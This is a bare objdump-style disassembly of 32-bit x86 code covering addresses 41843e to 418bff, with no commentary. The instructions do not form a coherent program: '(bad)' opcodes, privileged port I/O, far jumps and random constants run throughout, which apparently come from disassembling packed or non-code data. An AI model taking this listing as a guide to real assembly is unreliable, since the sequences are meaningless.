  41843e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41843f:	fstp   DWORD PTR [eax+0x1cfc3aef]
  418445:	fimul  WORD PTR cs:[ebx+esi*8-0x3072fe4f]
  41844d:	add    eax,DWORD PTR [edx+edx*4-0x46]
  418451:	mov    ds:0x9cc4e077,eax
  418456:	or     edi,eax
  418458:	dec    edi
  418459:	pop    eax
  41845a:	sub    eax,0x5a69c31b
  41845f:	inc    esp
  418460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418461:	imul   esp,DWORD PTR [ecx],0x17ecf901
  418467:	add    DWORD PTR [esi+edx*4],ebx
  41846a:	pusha  
  41846b:	add    al,0xc7
  41846d:	xor    BYTE PTR [esi+0x20],ch
  418470:	lods   al,BYTE PTR ds:[esi]
  418471:	mov    eax,0x6a699438
  418476:	mov    bh,0xad
  418478:	icebp  
  418479:	fadd   QWORD PTR [ebp-0x3f]
  41847c:	inc    eax
  41847d:	mov    ebx,0x7b3ac7ea
  418482:	leave  
  418483:	rol    DWORD PTR [eax],cl
  418485:	xchg   DWORD PTR [eax],ebx
  418487:	xchg   ebx,eax
  418488:	adc    DWORD PTR [edi+0x17],edx
  41848b:	cmp    DWORD PTR [ecx+0x69],esp
  41848e:	rcr    DWORD PTR [ebp-0x52],cl
  418491:	shl    BYTE PTR [edi],1
  418493:	popa   
  418494:	call   0x27b7587
  418499:	stos   DWORD PTR es:[edi],eax
  41849a:	lods   al,BYTE PTR cs:[esi]
  41849c:	in     eax,0x69
  41849e:	xor    ch,BYTE PTR [edi+0x5]
  4184a1:	sub    al,0x6c
  4184a3:	jp     0x41843e
  4184a5:	addr16 xchg esi,eax
  4184a7:	or     ecx,0xd06848ce
  4184ad:	mov    ch,0xa5
  4184af:	mov    ebx,esi
  4184b1:	jno    0x4184be
  4184b3:	sub    al,0xca
  4184b5:	aaa    
  4184b6:	sbb    eax,0xe4451170
  4184bb:	sub    al,0x9c
  4184bd:	in     al,dx
  4184be:	mov    dh,0xc1
  4184c0:	inc    esi
  4184c1:	sub    dl,BYTE PTR [edx-0x2e6a17f5]
  4184c7:	ja     0x4184f3
  4184c9:	cld    
  4184ca:	mov    esi,0x6f089fac
  4184cf:	(bad)  
  4184d0:	mov    dl,0xfb
  4184d2:	les    esp,FWORD PTR [edx+0x74]
  4184d5:	push   ecx
  4184d6:	pop    ebx
  4184d7:	xor    ebx,DWORD PTR [edi-0x38]
  4184da:	cmp    dh,BYTE PTR [ebp+eiz*2+0x38f28480]
  4184e1:	fild   DWORD PTR [edi]
  4184e3:	pop    ebp
  4184e4:	popf   
  4184e5:	jge    0x418473
  4184e7:	jmp    0x49feb67a
  4184ec:	ret    
  4184ed:	xor    DWORD PTR [ecx],0xc
  4184f0:	adc    al,0xa
  4184f2:	or     DWORD PTR [edi+0x63],edi
  4184f5:	xchg   BYTE PTR [ecx],dh
  4184f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184f8:	mov    eax,DWORD PTR [edi]
  4184fa:	xchg   esi,eax
  4184fb:	sbb    DWORD PTR [esi+0x23],0x34b1faac
  418502:	inc    ecx
  418503:	jb     0x4184db
  418505:	fisub  WORD PTR [ebx+0x11]
  418508:	adc    DWORD PTR [esi],eax
  41850a:	mov    DWORD PTR [ebx-0x7733e718],edi
  418510:	lods   al,BYTE PTR ds:[esi]
  418511:	lock adc ecx,DWORD PTR [ebx+ebp*2]
  418515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418516:	add    ebx,DWORD PTR [edi+0x29]
  418519:	ret    0xa5
  41851c:	xchg   edx,eax
  41851d:	popa   
  41851e:	ror    BYTE PTR [esi+ebp*2+0x307fd5ce],0xc9
  418526:	sbb    bl,al
  418528:	inc    esp
  418529:	jmp    0x1b75:0x94ca1003
  418530:	fist   DWORD PTR [edx+0x6]
  418533:	fcom   QWORD PTR [edx+0x44]
  418536:	mov    esp,0x3a55d07f
  41853b:	or     al,0xd
  41853d:	fld    DWORD PTR [ebx]
  41853f:	add    al,0x3d
  418541:	mov    al,0x89
  418543:	int    0xa
  418545:	stos   DWORD PTR es:[edi],eax
  418546:	sbb    dl,ch
  418548:	xor    ah,BYTE PTR [edi+0x67712273]
  41854e:	inc    edx
  41854f:	js     0x41852e
  418551:	mov    dl,0x94
  418553:	mov    ah,ah
  418555:	fld    TBYTE PTR [ecx+0x5f]
  418558:	push   edi
  418559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41855a:	or     edi,DWORD PTR [edi+0x26062d0a]
  418560:	dec    ebx
  418561:	mov    eax,ds:0x568168f3
  418566:	addr16 rol ebp,1
  418569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41856a:	jno    0x418504
  41856c:	mov    esp,0xa6a96b
  418571:	aad    0xd4
  418573:	cli    
  418574:	shl    BYTE PTR [edx+0x6b418529],cl
  41857a:	xchg   ecx,eax
  41857b:	pusha  
  41857c:	mov    bl,0x9e
  41857e:	(bad)  
  418580:	les    ecx,FWORD PTR [ecx-0x7cb47e50]
  418586:	xchg   esi,eax
  418587:	idiv   BYTE PTR [edx]
  418589:	outs   dx,BYTE PTR ds:[esi]
  41858a:	fwait
  41858b:	mov    eax,0xb2224402
  418590:	mov    ch,0x45
  418592:	repz pop eax
  418594:	ds in  al,0xd0
  418597:	pop    edi
  418598:	icebp  
  418599:	icebp  
  41859a:	push   0x2f
  41859c:	or     ebp,DWORD PTR [ebp-0x6019eba1]
  4185a2:	test   eax,0xb25b158d
  4185a7:	aas    
  4185a8:	and    BYTE PTR [edi],cl
  4185aa:	pop    ds
  4185ab:	cli    
  4185ac:	mov    dh,BYTE PTR [esi+0x64b23cf3]
  4185b2:	not    ch
  4185b4:	jp     0x418582
  4185b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185b7:	adc    bh,0x1a
  4185ba:	xor    bh,dh
  4185bc:	in     al,0xe8
  4185be:	push   esp
  4185bf:	aad    0xde
  4185c1:	dec    esi
  4185c2:	cmp    esi,DWORD PTR [esi+0xe4b21ea]
  4185c8:	sbb    DWORD PTR [esi],ecx
  4185ca:	outs   dx,BYTE PTR ds:[esi]
  4185cb:	push   0x46d7370d
  4185d0:	sub    al,0x74
  4185d2:	add    ah,bh
  4185d4:	stos   DWORD PTR es:[edi],eax
  4185d5:	call   0x58e8181e
  4185da:	outs   dx,BYTE PTR ds:[esi]
  4185db:	inc    ebp
  4185dc:	(bad)  
  4185dd:	and    cl,al
  4185df:	adc    al,bh
  4185e1:	sar    DWORD PTR [ebx+0x446659f7],0xce
  4185e8:	fcomp  DWORD PTR [edi]
  4185ea:	adc    al,0x1b
  4185ec:	cmp    BYTE PTR [eax+edi*4-0x47],bl
  4185f0:	xchg   ebp,eax
  4185f1:	push   cs
  4185f2:	je     0x41863d
  4185f4:	inc    edi
  4185f5:	cmp    ebp,DWORD PTR [ebp-0x59]
  4185f8:	xchg   esp,eax
  4185f9:	or     edx,DWORD PTR [edi]
  4185fb:	adc    al,0x22
  4185fd:	adc    ebp,edi
  4185ff:	pop    ebx
  418600:	cld    
  418601:	mov    al,ds:0x60ab3d37
  418606:	imul   esp,DWORD PTR [eax-0x790b230f],0xffffffa3
  41860d:	repnz inc ebp
  41860f:	inc    edx
  418610:	sub    DWORD PTR [ebx+0x1eda2a10],edi
  418616:	scas   eax,DWORD PTR es:[edi]
  418617:	pop    ecx
  418618:	and    DWORD PTR [eax-0x9ac9b48],eax
  41861e:	add    BYTE PTR [edx-0x4134b022],bh
  418624:	mov    edx,0x5a94f0f2
  418629:	adc    dl,0xf
  41862c:	je     0x4185d9
  41862e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41862f:	retf   
  418630:	outs   dx,DWORD PTR ds:[esi]
  418631:	cmc    
  418632:	mov    ch,0xaa
  418634:	out    dx,al
  418635:	mov    ah,0xfc
  418637:	sub    eax,0x302ba2d1
  41863c:	mov    ds:0x82c555a,eax
  418641:	sub    al,0xd2
  418643:	sahf   
  418644:	and    al,0x81
  418646:	mov    DWORD PTR [ebp+0x340b144],edx
  41864c:	adc    eax,0x32112057
  418651:	xchg   edx,eax
  418652:	hlt    
  418653:	sbb    BYTE PTR [ebx-0x48],dh
  418656:	add    al,0x53
  418658:	ins    DWORD PTR es:[edi],dx
  418659:	dec    ecx
  41865a:	outs   dx,DWORD PTR ds:[esi]
  41865b:	rol    DWORD PTR [ecx+0x62],1
  41865e:	movhps xmm5,QWORD PTR [esi+ebp*1]
  418662:	and    ebx,DWORD PTR [ebx+0x46]
  418665:	jl     0x4186bc
  418667:	xchg   BYTE PTR [ecx*4+0x5811df1b],dh
  41866e:	hlt    
  41866f:	cmp    esp,DWORD PTR [ecx+0x4]
  418672:	jnp    0x41865c
  418674:	(bad)  
  418675:	pop    ecx
  418676:	jno    0x4186b3
  418678:	fdiv   DWORD PTR [edi+0x25]
  41867b:	sahf   
  41867c:	in     al,dx
  41867d:	rol    DWORD PTR [ecx],1
  41867f:	adc    dh,dh
  418681:	sub    eax,0x11196cc1
  418686:	or     BYTE PTR [edx-0x2532e1d0],0xbe
  41868d:	push   ebx
  41868e:	push   eax
  41868f:	repnz inc ebx
  418691:	mov    ah,0x2f
  418693:	pop    ebp
  418694:	test   eax,0xf6845a61
  418699:	lock (bad) 
  41869b:	sti    
  41869c:	jmp    0x1bac00b2
  4186a1:	lock shr BYTE PTR fs:[edx+0x31992fe0],0x24
  4186aa:	adc    dl,BYTE PTR [ecx]
  4186ac:	mov    eax,DWORD PTR [ebx+ebx*1]
  4186af:	sbb    esp,DWORD PTR [ecx+0x6b0a8ad7]
  4186b5:	sahf   
  4186b6:	shl    DWORD PTR [edx-0x23],1
  4186b9:	aaa    
  4186ba:	cmp    eax,0xae8e797a
  4186bf:	in     eax,0xec
  4186c1:	out    dx,al
  4186c2:	sbb    edx,ecx
  4186c4:	sub    eax,0x43cf7467
  4186c9:	retf   0x6b8f
  4186cc:	nop
  4186cd:	mov    cl,0x6
  4186cf:	je     0x418719
  4186d1:	inc    ecx
  4186d2:	cmpxchg DWORD PTR [edi+0x78a376cf],ebx
  4186d9:	sub    DWORD PTR [esi],esi
  4186db:	sub    eax,0xff27b0c6
  4186e0:	loope  0x4186ed
  4186e2:	push   ecx
  4186e3:	in     eax,0xe0
  4186e5:	dec    esi
  4186e6:	jp     0x4186b8
  4186e8:	stos   BYTE PTR es:[edi],al
  4186e9:	(bad)  [edx+0x25]
  4186ec:	pop    esp
  4186ed:	lods   al,BYTE PTR ds:[esi]
  4186ee:	data16 cmp BYTE PTR [ebx-0x12da8249],cl
  4186f5:	test   DWORD PTR [ebx-0x7b],0x2d271f73
  4186fc:	jmp    0xabc7:0x4d3cb8c9
  418703:	pop    ds
  418704:	cmc    
  418705:	repnz aad 0xd9
  418708:	scas   eax,DWORD PTR es:[edi]
  418709:	and    DWORD PTR [esi+0x62d9987],edx
  41870f:	xchg   edx,eax
  418710:	adc    DWORD PTR [edx+ebp*8-0x1f],esi
  418714:	rol    DWORD PTR [ebx-0x6c449ec4],cl
  41871a:	in     eax,0xbc
  41871c:	and    al,cl
  41871e:	gs hlt 
  418720:	fnstsw WORD PTR [eax+edx*8-0x35]
  418724:	int    0xb7
  418726:	or     ebp,ebx
  418728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418729:	mov    edx,0xf859b670
  41872e:	fwait
  41872f:	adc    DWORD PTR [eax],edi
  418731:	cmp    dl,BYTE PTR ds:0xa6d0c4f
  418737:	sub    DWORD PTR [ebx],esp
  418739:	xor    BYTE PTR [esi+0x264ca82e],dl
  41873f:	rcl    BYTE PTR [esp+ebp*4],1
  418742:	push   ebp
  418743:	ja     0x41879b
  418745:	xchg   edx,eax
  418746:	js     0x418768
  418748:	cmp    BYTE PTR [edi],cl
  41874a:	mov    al,0x7e
  41874c:	fwait
  41874d:	(bad)  
  41874e:	dec    edi
  41874f:	int    0x96
  418751:	fs cmc 
  418753:	arpl   WORD PTR [ecx+0x14],di
  418756:	pop    edx
  418757:	daa    
  418758:	inc    eax
  418759:	aaa    
  41875a:	lahf   
  41875b:	adc    al,0x6a
  41875d:	xlat   BYTE PTR ds:[ebx]
  41875e:	enter  0xfddd,0x89
  418762:	inc    ebp
  418763:	es cdq 
  418765:	cmpxchg BYTE PTR [esi],bh
  418768:	xchg   BYTE PTR [esi+0x4d],dl
  41876b:	push   0x1b
  41876d:	pop    ebp
  41876e:	xchg   BYTE PTR [ebx],al
  418770:	add    al,0xf9
  418772:	mov    esi,0xf8754765
  418777:	not    bh
  418779:	div    DWORD PTR [eax]
  41877b:	clc    
  41877c:	das    
  41877d:	cs hlt 
  41877f:	jl     0x4187e5
  418781:	mov    WORD PTR [esi+0x435a2c4b],?
  418787:	jle    0x4187f8
  418789:	mov    DWORD PTR [ecx+0x48],ecx
  41878c:	ins    BYTE PTR es:[edi],dx
  41878d:	push   esp
  41878e:	mov    esi,es
  418790:	call   0x32ad465e
  418795:	xchg   ecx,eax
  418796:	cmp    BYTE PTR [esi],ah
  418798:	mov    edi,0x305376d0
  41879d:	mov    edx,0x8bddc84b
  4187a2:	ss cs cmp al,0x28
  4187a6:	pop    ss
  4187a7:	pop    ds
  4187a8:	mov    BYTE PTR [esi-0x7b],dl
  4187ab:	outs   dx,BYTE PTR ds:[esi]
  4187ac:	inc    ebp
  4187ad:	in     eax,dx
  4187ae:	out    0x67,eax
  4187b0:	mov    ebp,0x60ae7838
  4187b5:	int    0x9d
  4187b7:	pop    eax
  4187b8:	xor    edx,DWORD PTR [ecx-0xc]
  4187bb:	inc    edx
  4187bc:	mov    ds:0x479cc548,eax
  4187c1:	or     al,bl
  4187c3:	fild   QWORD PTR [edi-0x32]
  4187c6:	xchg   esp,eax
  4187c7:	add    ebx,DWORD PTR [edx-0x44]
  4187ca:	lods   al,BYTE PTR ds:[esi]
  4187cb:	xor    DWORD PTR [ebp-0x26],0xad398bfd
  4187d2:	cwde   
  4187d3:	pop    ebx
  4187d4:	jg     0x4187d3
  4187d6:	cmp    eax,0xa2d5bb7e
  4187db:	adc    al,0xa4
  4187dd:	in     al,dx
  4187de:	fisubr DWORD PTR [edi-0x51]
  4187e1:	adc    DWORD PTR [edx+0x3d9affef],ebx
  4187e7:	sbb    eax,0x965f2eb
  4187ec:	scas   eax,DWORD PTR es:[edi]
  4187ed:	jge    0x4187d4
  4187ef:	sbb    edi,DWORD PTR [edx-0x2cb58714]
  4187f5:	lahf   
  4187f6:	pop    ebx
  4187f7:	jb     0x41885b
  4187f9:	adc    DWORD PTR [esi],0x45
  4187fc:	arpl   WORD PTR ds:0x481c747d,di
  418802:	aad    0x87
  418804:	stos   BYTE PTR es:[edi],al
  418805:	leave  
  418806:	push   es
  418807:	lahf   
  418808:	aas    
  418809:	mov    esp,0x6f316f87
  41880e:	pop    ecx
  41880f:	inc    ecx
  418810:	rcl    ebp,1
  418812:	int3   
  418813:	call   0x743ecf80
  418818:	inc    ecx
  418819:	mov    cl,0x67
  41881b:	ins    DWORD PTR es:[edi],dx
  41881c:	push   edx
  41881d:	cmp    al,BYTE PTR [edx+0x58f0a657]
  418823:	fld    QWORD PTR [eax-0x3b233a72]
  418829:	clc    
  41882a:	push   ebp
  41882b:	push   ss
  41882c:	inc    esp
  41882d:	xchg   edx,eax
  41882e:	das    
  41882f:	ds arpl dx,bx
  418832:	mov    esi,0xc529f06b
  418837:	inc    edi
  418838:	inc    ebp
  418839:	ja     0x418828
  41883b:	pop    eax
  41883c:	std    
  41883d:	cdq    
  41883e:	dec    edx
  41883f:	mov    ah,0xe3
  418841:	loopne 0x418833
  418843:	mov    ah,0x9f
  418845:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418846:	mov    cl,0xa4
  418848:	xor    DWORD PTR ds:0x7b5bed28,esp
  41884e:	test   DWORD PTR [esi],0x742dedff
  418854:	mov    cl,0x12
  418856:	aad    0x7b
  418858:	dec    esi
  418859:	ins    DWORD PTR es:[edi],dx
  41885a:	xlat   BYTE PTR ds:[ebx]
  41885b:	mov    ch,0x8f
  41885d:	jbe    0x4188dd
  41885f:	scas   al,BYTE PTR es:[edi]
  418860:	mov    cs,WORD PTR [esi]
  418862:	add    BYTE PTR [edx],al
  418864:	add    ebp,DWORD PTR [esi-0x2]
  418867:	(bad)  
  418868:	sub    al,BYTE PTR [ebx]
  41886a:	sub    dh,BYTE PTR [edx-0x27]
  41886d:	jle    0x4188bf
  41886f:	ror    BYTE PTR [ecx+edi*8+0x6e],0x66
  418874:	mov    ebp,0x6d7f0aaf
  418879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41887a:	sub    BYTE PTR [eax-0x30dd3e21],0x55
  418881:	fnop   
  418883:	fwait
  418884:	push   cs
  418885:	mov    cl,0xa6
  418887:	lea    ecx,[eax-0x68]
  41888a:	fsubp  st(7),st
  41888c:	xchg   ecx,eax
  41888d:	or     eax,esp
  41888f:	in     eax,dx
  418890:	into   
  418891:	scas   eax,DWORD PTR es:[edi]
  418892:	imul   ebx,DWORD PTR [edx+0x9],0x6
  418896:	cmp    BYTE PTR [esi-0xfa70be8],dh
  41889c:	fistp  DWORD PTR [ebp-0x63e8ea4]
  4188a2:	add    DWORD PTR [esi+0x6c4f01d8],ecx
  4188a8:	push   es
  4188a9:	mov    BYTE PTR [ebx+edi*1-0x39],ah
  4188ad:	mov    DWORD PTR [edx-0x1a69d3db],esi
  4188b3:	xor    eax,0x97404026
  4188b8:	pop    edx
  4188b9:	add    ah,BYTE PTR ds:0x5970ba58
  4188bf:	lock fwait
  4188c1:	dec    edi
  4188c2:	pop    es
  4188c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188c4:	mov    ds:0xb3cb58f7,al
  4188c9:	hlt    
  4188ca:	dec    ebx
  4188cb:	fldcw  WORD PTR [ecx+eiz*8-0x33ee685]
  4188d2:	dec    edx
  4188d3:	pop    esp
  4188d4:	xor    eax,0x73301122
  4188d9:	std    
  4188da:	or     BYTE PTR [esi],0x5a
  4188dd:	or     bl,dl
  4188df:	hlt    
  4188e0:	shl    DWORD PTR [edi],1
  4188e2:	jmp    DWORD PTR [esi]
  4188e4:	adc    cl,BYTE PTR [ebp-0x6b]
  4188e7:	fwait
  4188e8:	or     BYTE PTR [eax],dh
  4188ea:	popa   
  4188eb:	dec    BYTE PTR [edx+ebp*2+0x7b6122e]
  4188f2:	inc    edx
  4188f3:	icebp  
  4188f4:	inc    edi
  4188f5:	repz sbb al,BYTE PTR [ecx+0x26]
  4188f9:	dec    ebp
  4188fa:	sbb    esi,DWORD PTR [edi+0x13b83ab2]
  418900:	adc    eax,0x457e1e66
  418905:	ds jb  0x4188e4
  418908:	ins    DWORD PTR es:[edi],dx
  418909:	fwait
  41890a:	jmp    0x341b:0xb99cf55
  418911:	mov    esi,0xd02570fd
  418916:	lods   al,BYTE PTR ds:[esi]
  418917:	stc    
  418918:	and    eax,0xb15b2aeb
  41891d:	div    BYTE PTR [ebx]
  41891f:	nop
  418920:	mov    edx,0x91d613f6
  418925:	inc    ebx
  418926:	add    eax,0x64154665
  41892b:	shl    esp,0x5e
  41892e:	sub    esi,DWORD PTR [ebx-0x2b60a181]
  418934:	in     al,dx
  418935:	or     BYTE PTR [ebx+0x56],cl
  418938:	mov    edx,0x2be7d813
  41893d:	in     al,0xe3
  41893f:	ficomp DWORD PTR [edx-0x1e]
  418942:	int3   
  418943:	pop    eax
  418944:	xor    eax,0xe856a9be
  418949:	fisttp QWORD PTR [edx-0x6b476781]
  41894f:	sbb    bl,BYTE PTR [eax-0x3b]
  418952:	mov    al,0xec
  418954:	call   0xd88:0x56474a9a
  41895b:	and    eax,0x47fb3e
  418960:	xor    bl,BYTE PTR [esi+0x1dbfa62b]
  418966:	cmp    al,0x21
  418968:	add    al,0x7e
  41896a:	dec    edi
  41896b:	cld    
  41896c:	dec    edi
  41896d:	mov    cl,0xa3
  41896f:	dec    ebp
  418970:	mov    ah,0x73
  418972:	fs push es
  418974:	and    BYTE PTR [eax],0x44
  418977:	inc    eax
  418978:	xor    DWORD PTR [esi+0xc9f8e4b],0x2f33b01
  418982:	loope  0x41892e
  418984:	pushf  
  418985:	push   esi
  418986:	cwde   
  418987:	push   0x5d06171f
  41898c:	addr16 or eax,0x1c
  418990:	add    BYTE PTR [edi],dl
  418992:	pop    ss
  418993:	ja     0x418a03
  418995:	mov    cl,0x8b
  418997:	pop    ebp
  418998:	mov    ds:0x9b34c3d3,eax
  41899d:	sub    DWORD PTR [ebx+0x2],0xa1eb3ff7
  4189a4:	not    BYTE PTR [eax+0x60]
  4189a7:	cld    
  4189a8:	loope  0x41897b
  4189aa:	inc    ebx
  4189ab:	test   DWORD PTR [edi+0x5fc24819],eax
  4189b1:	sbb    BYTE PTR [ebp+0x2],al
  4189b4:	call   0x71d65e6b
  4189b9:	imul   ebp,DWORD PTR [ebp+0x2d83dc04],0xffffffaf
  4189c0:	or     BYTE PTR [ebp+0x42485340],bh
  4189c6:	cli    
  4189c7:	jl     0x41897c
  4189c9:	push   edx
  4189ca:	popa   
  4189cb:	scas   al,BYTE PTR es:[edi]
  4189cc:	push   eax
  4189cd:	shr    BYTE PTR [edi+0x51cc43a6],cl
  4189d3:	sti    
  4189d4:	jge    0x4189fc
  4189d6:	pushf  
  4189d7:	ds pop es
  4189d9:	hlt    
  4189da:	call   0x1f68:0xd08dd6a3
  4189e1:	inc    DWORD PTR [eax+ecx*4-0x3c]
  4189e5:	lds    esp,FWORD PTR [edi-0x5f]
  4189e8:	repz retf 
  4189ea:	jb     0x4189e0
  4189ec:	lahf   
  4189ed:	ror    esi,1
  4189ef:	mov    dh,BYTE PTR [eax-0x8e16d2a]
  4189f5:	xor    edi,esp
  4189f7:	arpl   WORD PTR [ebx-0x4c],cx
  4189fa:	pop    edi
  4189fb:	ret    
  4189fc:	fsub   st,st(7)
  4189fe:	add    al,0xda
  418a00:	(bad)  
  418a01:	mov    esi,0x7ca8149e
  418a06:	iret   
  418a07:	cli    
  418a08:	add    al,0xc
  418a0a:	sti    
  418a0b:	xchg   ebp,eax
  418a0c:	(bad)  
  418a0e:	int    0xe0
  418a10:	mov    ch,0x7d
  418a12:	adc    al,0xb
  418a14:	push   esi
  418a15:	neg    BYTE PTR [ecx-0x8]
  418a18:	mov    bl,0x50
  418a1a:	and    DWORD PTR [edx-0x6005caeb],esi
  418a20:	fmul   st(0),st
  418a22:	sub    al,0x7a
  418a24:	cdq    
  418a25:	push   esp
  418a26:	inc    esi
  418a27:	mov    BYTE PTR [esi+0x7272f81f],bl
  418a2d:	data16 fadd st(6),st
  418a30:	test   eax,0xe82d9323
  418a35:	pop    ds
  418a36:	mov    bh,ch
  418a38:	jmp    0xb004:0xd89858c9
  418a3f:	pusha  
  418a40:	push   edx
  418a41:	call   0x12a5:0xb7a78c22
  418a48:	int3   
  418a49:	es sub eax,0x7750363f
  418a4f:	jae    0x418a29
  418a51:	int3   
  418a52:	imul   esi,DWORD PTR ds:0x1060895a,0x16
  418a59:	and    ecx,DWORD PTR [ebp-0x7]
  418a5c:	jns    0x418ad5
  418a5e:	xchg   edx,eax
  418a5f:	aam    0x33
  418a61:	ja     0x418aaa
  418a63:	mov    al,ds:0x66c393ea
  418a68:	outs   dx,BYTE PTR ds:[esi]
  418a69:	adc    edx,DWORD PTR [esp+eax*8+0x40]
  418a6d:	test   al,0x44
  418a6f:	mov    esi,0x68d82caf
  418a74:	mov    eax,ds:0xd493b1d8
  418a79:	bound  esp,QWORD PTR [edx-0x6a]
  418a7c:	outs   dx,DWORD PTR ds:[esi]
  418a7d:	into   
  418a7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a7f:	add    ch,BYTE PTR [edi+0x74]
  418a82:	in     eax,0x86
  418a84:	jl     0x418aff
  418a86:	(bad)  [esi-0x30]
  418a89:	jl     0x418aad
  418a8b:	jns    0x418a5b
  418a8d:	ins    BYTE PTR es:[edi],dx
  418a8e:	adc    BYTE PTR [edx+0x6b],bl
  418a91:	mov    al,ds:0xf1ca1bd4
  418a96:	popa   
  418a97:	cmp    DWORD PTR [edx-0x454ceb51],edi
  418a9d:	enter  0x7559,0xed
  418aa1:	mov    ebp,0xd5712d30
  418aa6:	lea    edx,[ecx-0x6c0b1d99]
  418aac:	push   ebp
  418aad:	or     dh,dl
  418aaf:	pop    ss
  418ab0:	ret    
  418ab1:	xchg   ebx,eax
  418ab2:	lds    esp,FWORD PTR [edx]
  418ab4:	scas   eax,DWORD PTR es:[edi]
  418ab5:	push   ss
  418ab6:	dec    esi
  418ab7:	mov    cl,0xed
  418ab9:	pusha  
  418aba:	push   esi
  418abb:	inc    ebp
  418abc:	std    
  418abd:	mov    esp,0x16db0eda
  418ac2:	jo     0x418af0
  418ac4:	test   BYTE PTR ds:0x4315e7b9,al
  418aca:	pop    esp
  418acb:	test   DWORD PTR [eax-0x5e],ebx
  418ace:	rcr    DWORD PTR [esi+0x1f161297],cl
  418ad4:	mov    bl,BYTE PTR [eax+esi*2+0x6320ce33]
  418adb:	mov    es,WORD PTR [ebx+0x6c321a1d]
  418ae1:	iret   
  418ae2:	(bad)  
  418ae3:	repnz push ds
  418ae5:	jge    0x418ac5
  418ae7:	rcl    DWORD PTR [edi-0x1c],cl
  418aea:	and    BYTE PTR [edx+0x3e],0x29
  418aee:	faddp  st(4),st
  418af0:	call   0x85c1:0x978944c6
  418af7:	push   ds
  418af8:	adc    DWORD PTR ds:0xe3b03c1a,ebx
  418afe:	daa    
  418aff:	adc    edi,ebx
  418b01:	into   
  418b02:	inc    ebp
  418b03:	jne    0x418ab7
  418b05:	jle    0x418b6e
  418b07:	xchg   esi,eax
  418b08:	ins    BYTE PTR es:[edi],dx
  418b09:	retf   0x482
  418b0c:	pushfw 
  418b0e:	clc    
  418b0f:	cld    
  418b10:	add    ebx,DWORD PTR [esi]
  418b12:	ins    BYTE PTR es:[edi],dx
  418b13:	adc    BYTE PTR [edi],0xcc
  418b16:	fcom   QWORD PTR [eax+0x53]
  418b19:	push   0xffffff88
  418b1b:	sub    dh,cl
  418b1d:	push   edi
  418b1e:	addr16 mov ds,ecx
  418b21:	test   al,0x2e
  418b23:	loopne 0x418b4b
  418b25:	inc    ebx
  418b26:	(bad)  
  418b27:	in     eax,0x18
  418b29:	push   cs
  418b2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b2b:	or     eax,0xfc5b4274
  418b30:	cmp    ebx,ebp
  418b32:	stc    
  418b33:	leave  
  418b34:	pop    ebp
  418b35:	js     0x418b59
  418b37:	mov    bh,0xfc
  418b39:	cld    
  418b3a:	and    al,0x46
  418b3c:	push   0x10
  418b3e:	addr16 cmc 
  418b40:	push   cs
  418b41:	add    eax,0x168447c8
  418b46:	mov    ds:0xe63ba660,eax
  418b4b:	inc    ebp
  418b4c:	imul   ecx,esp,0xf32deb8
  418b52:	aaa    
  418b53:	sub    eax,0x22b907e3
  418b58:	mov    es,eax
  418b5a:	je     0x418bc1
  418b5c:	push   edx
  418b5d:	stc    
  418b5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b5f:	nop
  418b60:	adc    eax,0x407e730a
  418b65:	aad    0xd0
  418b67:	(bad)  
  418b68:	pop    ebx
  418b69:	pop    esi
  418b6a:	mov    edx,ebx
  418b6c:	data16 cld 
  418b6e:	pop    edx
  418b6f:	int    0x30
  418b71:	adc    ebp,DWORD PTR [ecx+ebx*2+0x30]
  418b75:	adc    DWORD PTR [ebp+0xcaad1e8],esp
  418b7b:	mov    ds:0x449da35f,eax
  418b80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b81:	sub    BYTE PTR [edx+ebp*2],cl
  418b84:	(bad)  
  418b85:	das    
  418b86:	loopne 0x418bc4
  418b88:	pop    ebp
  418b89:	cmp    ebp,DWORD PTR [esi+0x1f6ae21a]
  418b8f:	les    esi,FWORD PTR [ebx]
  418b91:	adc    eax,0x1c055c24
  418b96:	mov    ds:0x460b5e45,al
  418b9b:	mov    al,ds:0x86cf43c5
  418ba0:	out    0x1f,eax
  418ba2:	xor    BYTE PTR [edi],dl
  418ba4:	mov    bl,BYTE PTR [edi+0x5d4f1cd6]
  418baa:	mov    BYTE PTR [eax-0x1d],bh
  418bad:	or     DWORD PTR [edx],ecx
  418baf:	lods   al,BYTE PTR ds:[esi]
  418bb0:	dec    edx
  418bb1:	jno    0x418b33
  418bb3:	mov    ebx,0x8ecca05e
  418bb8:	pop    esp
  418bb9:	push   ss
  418bba:	mov    dl,0x97
  418bbc:	dec    ecx
  418bbd:	pop    DWORD PTR [edx+eax*1]
  418bc0:	aam    0xc2
  418bc2:	mov    dh,0x23
  418bc4:	sbb    al,0xea
  418bc6:	fsub   QWORD PTR [esi-0x54]
  418bc9:	xor    cl,BYTE PTR [eax+0x65]
  418bcc:	jmp    0x418b56
  418bce:	fst    DWORD PTR [edx-0x37]
  418bd1:	jne    0x418b78
  418bd3:	loopne 0x418bda
  418bd5:	add    dh,dl
  418bd7:	lea    ebp,[eax]
  418bd9:	cs sahf 
  418bdb:	js     0x418b8e
  418bdd:	hlt    
  418bde:	xor    ah,BYTE PTR [eax+edi*1]
  418be1:	clc    
  418be2:	dec    ebp
  418be3:	int    0x47
  418be5:	test   eax,0x78e911c4
  418bea:	in     eax,0x12
  418bec:	and    eax,0x8e580ba5
  418bf1:	xchg   edx,eax
  418bf2:	cli    
  418bf3:	adc    ebp,edx
  418bf5:	cli    
  418bf6:	addr16 and ch,dl
  418bf9:	sbb    DWORD PTR [ebx-0x44],0xffffff9f
  418bfd:	inc    ebp
  418bfe:	iret   
  418bff:	xor    eax,0xe537a859
